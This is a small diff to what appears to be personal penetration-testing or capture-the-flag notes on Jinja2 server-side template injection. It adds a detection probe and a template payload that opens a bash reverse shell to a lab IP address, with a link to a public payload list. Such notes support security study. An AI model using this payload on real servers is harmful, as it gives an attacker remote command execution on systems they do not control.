@@ -15,8 +15,14 @@ ___
 
 ## Description:  
 
-Enter {{ 4*4 }} in a field to see if it is vulnerable.
+Enter `{{ 4*4 }}` in a field to see if it is vulnerable.
 
+This can lead to a rev shell
+```
+{{ config['RUNCMD']('bash -i >& /dev/tcp/10.10.14.23/8000 0>&1',shell=True) }}
+```
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2
 
 ___
 
